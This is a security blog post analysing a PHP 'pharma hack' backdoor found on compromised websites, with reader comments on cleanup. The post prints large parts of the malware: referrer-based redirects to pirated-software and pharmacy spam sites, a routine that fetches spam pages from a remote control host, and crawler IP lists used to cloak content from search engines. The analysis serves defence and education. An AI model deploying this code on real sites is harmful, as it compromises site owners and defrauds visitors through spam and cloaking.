<p>The first thing that pops out when looking at the code is the introduction of the online store. The following snippet creates an array with different product names and terms. </p>
<p>Depending on the $_SERVER[&#8220;HTTP_REFERER&#8221;] and the term used the malware redirects the USER to an online store which is likely being controlled by the attacker to generate revenue &#8211; an example of an monetized attack.</p>
<blockquote><p>
&lt;?php<br />
$keyspat = array(<br />
&#8216;adobe creative suite 5.5 master collection&#8217;,<br />
&#8216;microsoft windows 7 ultimate&#8217;,<br />
&#8216;microsoft office 2010 professional plus&#8217;,<br />
&#8216;adobe acrobat x pro&#8217;,<br />
&#8230;<br />
&#8216;microsoft&#8217;,<br />
&#8216;soft&#8217; => &#8216;adobe&#8217;,<br />
&#8216;cheap&#8217; => &#8216;adobe&#8217;,<br />
&#8216;price&#8217; => &#8216;adobe&#8217;,<br />
&#8216;order&#8217; => &#8216;adobe&#8217;,<br />
&#8216;sale&#8217; => &#8216;adobe&#8217;,<br />
&#8216;buy&#8217; => &#8216;adobe&#8217;,<br />
&#8216;professional&#8217; => &#8216;adobe&#8217;,<br />
&#8216;system&#8217; => &#8216;adobe&#8217;,<br />
);</p>
<p>$rfrr = urldecode($_SERVER[&#8220;HTTP_REFERER&#8221;]);<br />
foreach ($keyspat as $k => $v)<br />
{<br />
     if (is_int($k))<br />
     {<br />
          if (stripos($rfrr,$v))<br />
          {<br />
               header(&#8220;Location:       http://outlet-programs.net/browse/search/?q=&#8221;.$v);<br />
               exit;<br />
          }<br />
     }<br />
     else<br />
     {<br />
          if (stripos($rfrr,$k))<br />
          {<br />
               header(&#8220;Location:       http://outlet-programs.net/browse/search/?q=&#8221;.$v);<br />
               exit;<br />
          }<br />
     }<br />
}<br />
?&rt;
</p></blockquote>
<h4><strong>2. Home Sweet Home</strong></h4>
<p>The next thing you notice is the creation of its own little home away from home on the targets environment, how cute&#8230; </p>
<blockquote><p>
&lt;?php<br />
$adm_url        = &#8216;http://tdsinto.net/big/gtxt.php?pg=&#8217;;<br />
$page_upd_time  = 60*60*24;//1 day<br />
$empty_upd_time = 60*60*24*10;//10 days</p>
<p>error_reporting(0);</p>
<p>if (isset($_POST[&#8216;test_mode&#8217;]) &#038;&#038; $_POST[&#8216;test_mode&#8217;]==1)<br />
{<br />
	if (!is_dir(&#8216;tmp&#8217;))<br />
	{<br />
		$res = mkdir(&#8216;tmp&#8217;);<br />
		if ($res===false) {exit(&#8216;Folder create error&#8217;);}<br />
		@chmod(&#8216;tmp&#8217;,0777);<br />
	}</p>
<p>	@file_put_contents(&#8216;tmp/1&#8242;,&#8217;123&#8217;);<br />
	if (!is_file(&#8216;tmp/1&#8217;)) {exit(&#8216;File create error&#8217;);}<br />
	@unlink(&#8216;tmp/1&#8217;);<br />
	exit(&#8216;All ok&#8217;);</p>
<p>}
</p></blockquote>
<p>If specific conditions are met via a <strong>$_POST</strong> variable (test_mode), the attacker can set up the environment to host their SPAM.</p>
<p>From the snippet above you can see the script checking that the <strong>tmp</strong> directory exists on the server, if it doesn&#8217;t it creates it and sets its permissions to 777 (read, write, execute to owner, group and others). It then verifies full control of the directory by creating a file inside the directory for further use. </p>
<p>I like that, its own built-in unit testing, how nice. It&#8217;s good to see that even the developers with malicious intent follow good SDLC best practice. </p>
<h4><strong>3. Avoiding Automatic Detection (Crawlers)</strong></h4>
<p>The following snippet is a very clever in its intent. </p>
<blockquote><p>
$stop_ips_masks = array(<br />
&#8220;66.249.[6-9][0-9].[0-9]+&#8221;,    // Google    NetRange:   66.249.64.0 &#8211; 66.249.95.255<br />
&#8220;74.125.[0-9]+.[0-9]+&#8221;,        // Google     NetRange:   74.125.0.0 &#8211; 74.125.255.255<br />
&#8220;65.5[2-5].[0-9]+.[0-9]+&#8221;,    // MSN        NetRange:   65.52.0.0 &#8211; 65.55.255.255,<br />
&#8220;74.6.[0-9]+.[0-9]+&#8221;,        // Yahoo    NetRange:   74.6.0.0 &#8211; 74.6.255.255<br />
&#8220;67.195.[0-9]+.[0-9]+&#8221;,        // Yahoo#2    NetRange:   67.195.0.0 &#8211; 67.195.255.255<br />
&#8220;72.30.[0-9]+.[0-9]+&#8221;,        // Yahoo#3    NetRange:   72.30.0.0 &#8211; 72.30.255.255<br />
&#8220;38.[0-9]+.[0-9]+.[0-9]+&#8221;,     // Cuill:     NetRange:   38.0.0.0 &#8211; 38.255.255.255<br />
&#8220;93.172.94.227&#8221;,                // MacFinder<br />
&#8220;212.100.250.218&#8221;,            // Wells Search II<br />
&#8220;71.165.223.134&#8221;,            // Indy Library<br />
&#8220;70.91.180.25&#8221;,<br />
&#8220;65.93.62.242&#8221;, &#8220;74.193.246.129&#8221;, &#8220;213.144.15.38&#8221;, &#8220;195.92.229.2&#8221;, &#8230;<br />
 &#8220;165.160.2.20&#8221;, &#8220;89.122.224.230&#8221;, &#8220;66.230.175.124&#8221;, &#8220;218.18.174.27&#8221;, &#8230;<br />
&#8230;..<br />
&#8220;91.187.103.152&#8221;,<br />
&#8220;208.80.74.7&#8221;,<br />
&#8220;207.164.79.6&#8221;,<br />
&#8220;89.149.253.169&#8221;);</p>
<p>&#8230;
</p></blockquote>
<p>In it, the attacker tries to avoid being detected and blocked by web crawlers. Again, you can see a fairly significant range of IP&#8217;s, next to them you also see that the attacker was generous enough to tell us which IP&#8217;s belong to who. </p>
<h4><strong>4. Cherry on Top</strong></h4>
<p>And as the grand finale, you&#8217;ll find the code that actually downloads the payload to the environment to begin distribution. </p>
<p>The malware is downloaded to the <strong>tmp</strong> directory using a number of encoded(md5) files, each with SPAM injected within the files. Inside you will find the URL with the content being declared in the <strong>$adm_url</strong>. It also recognizes the importance of staying updated and checks to make sure it is, if its not, it updates itself. </p>
<p>Finally, it uses keywords as a condition, if the conditions are met, then it redirects the visitors to Canadian Pharma medication. </p>
<blockquote><p>
$our_page       = strtolower(&#8216;http://&#8217;.str_replace(&#8216;www.&#8217;,&#8221;,$_SERVER[&#8216;HTTP_HOST&#8217;])&#8230;<br />
$request_md5    = md5(strtolower($_SERVER[&#8216;REQUEST_URI&#8217;]));</p>
<p>if (!is_file(&#8216;tmp/&#8217;.$request_md5))<br />
{<br />
	if (is_dir(&#8216;tmp/&#8217;))<br />
	{<br />
		file_put_contents(&#8216;tmp/&#8217;.$request_md5,gpvvv3($adm_url.urlencode($our_page)));<br />
		clearstatcache();<br />
	}<br />
}</p>
<p>if (is_file(&#8216;tmp/&#8217;.$request_md5))<br />
{<br />
	$f_time = time() &#8211; filemtime($file_tmp_name);</p>
<p>	if (filesize(&#8216;tmp/&#8217;.$request_md5)==0)<br />
	{<br />
		if ($f_time > $empty_upd_time)<br />
		{<br />
			file_put_contents(&#8216;tmp/&#8217;.$request_md5,gpvvv3($adm_url.urlencode($our_page)));<br />
		}<br />
		return ;<br />
	}</p>
<p>	if ($f_time > $page_upd_time)<br />
	{<br />
		$cnttt = gpvvv3($adm_url.urlencode($our_page));<br />
		file_put_contents(&#8216;tmp/&#8217;.$request_md5,$cnttt);<br />
		if (empty($cnttt)) {return ;}<br />
		unset($cnttt);<br />
	}</p>
<p>	$is_bot = FALSE ;<br />
	foreach ( $stop_ips_masks as $k=>$v )<br />
	{<br />
		if (preg_match( &#8216;#^&#8217;.$v.&#8217;$#&#8217;, $_SERVER[&#8216;REMOTE_ADDR&#8217;])){	$is_bot = TRUE ;break;}<br />
	}<br />
	if ($is_bot === true) {echo file_get_contents(&#8216;tmp/&#8217;.$request_md5); exit;}</p>
<p>	$xxx = preg_replace( $user_agent_to_filter, &#8216;-NO-WAY-&#8216;, $_SERVER[&#8216;HTTP_USER_AGENT&#8217;] );<br />
	if( strpos( $xxx, &#8216;-NO-WAY-&#8216; ) !==  FALSE) {echo file_get_contents(&#8216;tmp/&#8217;.$request_md5); exit;}</p>
<p>	if (!empty($_SERVER[&#8216;HTTP_USER_AGENT&#8217;]))<br />
	{<br />
		if ( preg_match ( &#8216;#google|msn|bing|live|altavista|ask|yahoo|aol#i&#8217;, $_SERVER[&#8216;HTTP_REFERER&#8217;] ) )<br />
		{<br />
			if ( preg_match( &#8216;#[&#038;?][pq]=([^&#038;]+)#i&#8217;, $_SERVER[&#8216;HTTP_REFERER&#8217;] , $match ) )<br />
			{<br />
				$keyword = $match[1] ;<br />
				if ( preg_match (&#8216;/accutane|ACCUTANE|Accutane/i&#8217;,$keyword))<br />
				{<br />
					echo <<<HTML
<script type=text/javascript>
if (document.referrer.toLowerCase().indexOf(&#8216;viagra&#8217;)!=-1) location.href=&#8217;http://canadian-discount-meds.com/?aid=1751&#038;said=ed&#8217;;
if (document.referrer.toLowerCase().indexOf(&#8216;Viagra&#8217;)!=-1) location.href=&#8217;http://canadian-discount-meds.com/?aid=1751&#038;said=ed&#8217;;
if (document.referrer.toLowerCase().indexOf(&#8216;Cialis&#8217;)!=-1) location.href=&#8217;http://canadian-discount-meds.com/?aid=1751&#038;said=ed&#8217;;
if (document.referrer.toLowerCase().indexOf(&#8216;cialis&#8217;)!=-1) location.href=&#8217;http://canadian-discount-meds.com/?aid=1751&#038;said=ed&#8217;;
if (document.referrer.toLowerCase().indexOf(&#8216;Levitra&#8217;)!=-1) location.href=&#8217;http://canadian-discount-meds.com/?aid=1751&#038;said=ed&#8217;;
if (document.referrer.toLowerCase().indexOf(&#8216;levitra&#8217;)!=-1) location.href=&#8217;http://canadian-discount-meds.com/?aid=1751&#038;said=ed&#8217;;
if (document.referrer.toLowerCase().indexOf(&#8216;tadalafil&#8217;)!=-1) location.href=&#8217;http://canadian-discount-meds.com/?aid=1751&#038;said=ed&#8217;;
if (document.referrer.toLowerCase().indexOf(&#8216;Tadalafil&#8217;)!=-1) location.href=&#8217;http://canadian-discount-meds.com/?aid=1751&#038;said=ed&#8217;;
if (document.referrer.toLowerCase().indexOf(&#8216;pharmacy&#8217;)!=-1) location.href=&#8217;http://canadian-discount-meds.com/?aid=1751&#038;said=ed&#8217;;
</script><br />
HTML;<br />
					exit;<br />
				}<br />
			}<br />
		}<br />
	}<br />
}</p>
<p>function gpvvv3($url)<br />
{<br />
	if (function_exists(&#8216;curl_init&#8217;))<br />
	{<br />
		$ch = curl_init();<br />
		curl_setopt($ch, 13, 10);<br />
		curl_setopt($ch, 10002, $url);<br />
		curl_setopt($ch, 19913, true);<br />
		$some_content = curl_exec($ch);<br />
		curl_close($ch);<br />
	}<br />
	else<br />
	{<br />
		$some_content = file_get_contents($url);<br />
	}<br />
	return $some_content;<br />
}
</p></blockquote>
<p>As you can see the Pharma hack continues to evolve, its not just a matter of injecting a site with links to viagra, the entire game has changed. From the validation of permissions, to the encoding of payloads, to the conditional nature of displays; it certainly a level of sophistication that warrants a little bit of respect and appreciation.</p>
<hr />
<p>If you have any questions let us know at <a href="mailto:info@sucuri.net">info@sucuri.net</a></p>
<aside class="mashsb-container mashsb-main mashsb-stretched"><div class="mashsb-box"><div class="mashsb-buttons"><a class="mashicon-facebook mash-small mash-center mashsb-shadow" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.sucuri.net%2F2012%2F07%2Fpharma-hack-backdoor-analyzed-php5-php.html" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Facebook</span></a><a class="mashicon-twitter mash-small mash-center mashsb-shadow" href="https://twitter.com/intent/tweet?text=Pharma%20Hack%20Backdoor%20Analyzed%20%E2%80%93%20PHP5.PHP&url=https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html&via=sucurisecurity" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Twitter</span></a><a class="mashicon-subscribe mash-small mash-center mashsb-shadow" href="#" target="_top" rel="nofollow"><span class="icon"></span><span class="text">Subscribe</span></a><div class="onoffswitch2 mash-small mashsb-shadow" style="display:none;"></div></div>
            </div>
                <div style="clear:both;"></div></aside>
            <!-- Share buttons by mashshare.net - Version: 3.8.1--></div><footer class="entry-footer"><p class="entry-meta"><span class="entry-categories">Categories: <a href="https://blog.sucuri.net/category/security-education" rel="category tag">Security Education</a>, <a href="https://blog.sucuri.net/category/website-malware-infections" rel="category tag">Website Malware Infections</a></span><span class="entry-tags">Tags: <a href="https://blog.sucuri.net/tag/hacked-websites" rel="tag">Hacked Websites</a>, <a href="https://blog.sucuri.net/tag/seo-spam" rel="tag">SEO Spam</a>, <a href="https://blog.sucuri.net/tag/website-backdoor" rel="tag">Website Backdoor</a></span></p></footer></article><section class="author-box"><img alt='' src='https://secure.gravatar.com/avatar/8cf56aa2ff693db59b0e186bf1b34f5a?s=115&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/8cf56aa2ff693db59b0e186bf1b34f5a?s=230&#038;d=mm&#038;r=g 2x' class='avatar avatar-115 photo' height='115' width='115' loading='lazy'/><h4 class="author-box-title">About <span itemprop="name">Rodrigo Escobar</span></h4><div class="author-box-content" itemprop="description"><p>Rodrigo Escobar is Sucuri's Sr. Malware Research Manager who joined the company in 2012. Rodrigo's main responsibilities include the coordination of malware analysts and research groups, and deployment of effective remediation solutions. His professional experience covers more than eight years in website remediation and malware analysis. When Rodrigo isn't investigating cyber threats and looking for solutions to prevent them, you might find him at the computer, reading assembly and learning new skills. Connect with him on <a href="https://www.linkedin.com/in/rodrigo-escobar-6b313314/">LinkedIn</a>.</p>
</div></section><h2 class="screen-reader-text">Reader Interactions</h2><div class="entry-comments" id="comments"><h3>Comments</h3><ol class="comment-list">
	<li class="comment even thread-even depth-1" id="comment-5632">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/7a37ff29bb569f866de2d508989fa84d?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/7a37ff29bb569f866de2d508989fa84d?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://arthurklein.com" class="comment-author-link" rel="external nofollow" itemprop="url">theGuruWithin</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-07-24T05:27:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5632">July 24, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>is it enough to delete php5.php file or is there more to trashing this virus? </p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-5636">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/8cf56aa2ff693db59b0e186bf1b34f5a?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/8cf56aa2ff693db59b0e186bf1b34f5a?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Rodrigo Escobar</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-07-25T16:11:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5636">July 25, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hello Arthur,</p>
<p>There is more than just deleting the php5 file. That script creates the tmp directory mentioned above with all the encoded SPAM. Those are also part of the malicious code and should be removed as well.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-5633">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/7a37ff29bb569f866de2d508989fa84d?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/7a37ff29bb569f866de2d508989fa84d?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://arthurklein.com" class="comment-author-link" rel="external nofollow" itemprop="url">theGuruWithin</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-07-24T05:29:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5633">July 24, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>BTW i just moved one of my sites to WPEngine  so good to know that you are protecting them/us </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-5648">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ebf94440881919cb68de79d35cc1cd29?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ebf94440881919cb68de79d35cc1cd29?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Vid Luther</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-07-28T14:34:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5648">July 28, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Are there any known attack vectors for this? Things to look for in our logs to see if someone is attempting to put this file on systems?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-5678">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/325bb2b98b3cf82d342e6a7c8b669b29?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/325bb2b98b3cf82d342e6a7c8b669b29?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Chris</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-08-07T02:33:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5678">August 7, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p> I would also like to know the answer to this question.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-5754">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/3af018a8f3b2facc1ad6ba9022d443c2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3af018a8f3b2facc1ad6ba9022d443c2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Stergios</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-10-01T22:49:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5754">October 1, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>The attack vector can be any vulnerability like SQL injection remote file inclusion(RFI)  local file inclusion(LFI) unpatched servers, wrong folder and file permissions etc.</p>
<p>Generally there is NO connection between the type of the attack(e.g. PHARMA HACK) and the attack vector. In one installation could be achieved from a secuirty hole in plugin X and in other installation by exploiting a different vulnerability in a Theme Y</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-5698">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/c5cadd5fc170b62a0ae70ac96b1c1d42?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c5cadd5fc170b62a0ae70ac96b1c1d42?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">thuantta</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-08-24T00:00:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5698">August 24, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Our WP site just got attacked by this variant. I&#8217;ve deleted the entire WP installation and reinstalled it but reusing the same DB that I had. The next day the hack seems to have reappeared as our Google listing still shows our site with references to drugs so it seems cleaning a hacked WP is even more troublesome. Have you been able to clean out your DB to fully get rid of the hack?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-5846">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/d01a4807ce2d6decba012a66ab72d139?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/d01a4807ce2d6decba012a66ab72d139?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://qstudio.us/" class="comment-author-link" rel="external nofollow" itemprop="url">Q Studio</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-11-23T10:35:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5846">November 23, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>takes a good while for those Google links to clear up &#8211; from experience&#8230;</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-5718">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/79e8093768ffe7e8ec2055b76956070a?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/79e8093768ffe7e8ec2055b76956070a?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Doan</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-09-06T07:29:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5718">September 6, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>My site just got hacked, i was cleaned it but it still come back , i scan all my file for malware script, it inject to many type ( wp-config.php, wp-blog-header, wp-load &#8230; and include actual script from another places from plugin folder and themes folder ) This is the malware script <a href="http://textsnip.com/21e1e5" rel="nofollow ugc">http://textsnip.com/21e1e5</a> , I dont know how it come back&#8230;</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-5719">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/afe305cdacc2203c03feacf42078a189?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/afe305cdacc2203c03feacf42078a189?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.worldwealthbuilders.com/hard-money-lenders-in-canada.html" class="comment-author-link" rel="external nofollow" itemprop="url">Navtaj Chandhoke</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-09-06T23:25:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5719">September 6, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Our website is continuously attack. No matter how often we clean, it keeps coming back.any suggestions to get rid forever??? </p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-5724">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo avatar-default' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.facebook.com/people/Jim-Walker/100000736622420" class="comment-author-link" rel="external nofollow" itemprop="url">Jim Walker</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-09-07T23:06:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5724">September 7, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>First step is to break the website into it&#8217;s own solitary account. That way eliminating the possibility other sites sharing the same account are the actual root of the compromise. After that, it&#8217;s just a matter of installing the virgin files from the developers source website, then securing that nicely.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-5751">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/3af018a8f3b2facc1ad6ba9022d443c2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3af018a8f3b2facc1ad6ba9022d443c2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Stergios</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-10-01T07:32:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5751">October 1, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi,<br />
The site of my client has been infected from a vatiant of PHARMA HACK. I managed to clean it up and (finding the backdoors /tmp with malicious files etc). However I cannot cope well with the malicious cached links that I can find by doing site:cleintsite.com. The query returns about 4000 results which 90% of them are spammy queries like<br />
clientsite.com/?jezeyi=buy_praga_&#8230;.. buy_Louis_Vitton&#8230; Buy_cheap_something etc. I have set htaccess to return a 410 gone for every query that starts with jezeyi and also at webmastes tools I configured that jezeyi parameter does not affect the content delivered. However I cannot see any drop to the number of that links for about five days now except one day that they dropped to 3700 but they recoverd to 4000. Does anybody has any suggestion on how to remove that spammy links?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-5841">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/5e63e636f3393a282f7999061adc28a4?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/5e63e636f3393a282f7999061adc28a4?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">MT</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-11-13T17:31:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5841">November 13, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Just recently Google released a new webmaster tool for disavowing bad links. It might be the solution you&#8217;re looking for. <a href="http://googlewebmastercentral.blogspot.com/2012/10/a-new-tool-to-disavow-links.html" rel="nofollow ugc">http://googlewebmastercentral.blogspot.com/2012/10/a-new-tool-to-disavow-links.html</a></p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-5752">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/2beaf9d6a8edcc1f8fa4c69cb3b5d093?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/2beaf9d6a8edcc1f8fa4c69cb3b5d093?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Cameron</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-10-01T19:34:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5752">October 1, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I&#8217;ve deleted the offending files, changed all passwords (FTP, database, wordpress, etc), changed .htaccess permissions, etc..  the php5.php keeps coming back.  I don&#8217;t have any other compromised sites on my account &#8211; only one other wordpress installation on this account and it&#8217;s clean.  How does the hack keep coming back???</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-5753">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/3af018a8f3b2facc1ad6ba9022d443c2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3af018a8f3b2facc1ad6ba9022d443c2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Stergios</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2012-10-01T22:21:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-5753">October 1, 2012</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Probably from the same security hole that came in the first place. Update core and 3rd party plugins to the latest version also. By changing the passwords if the attacker did not used compromised credentials you cannot leave him out.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-6414">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/821cf26ccd72f8cf3dc003664db02efb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/821cf26ccd72f8cf3dc003664db02efb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Pat Wright</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-05-28T22:11:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2012/07/pharma-hack-backdoor-analyzed-php5-php.html#comment-6414">May 28, 2015</a></time></p>		</header>

		<div class="comment-content">
			
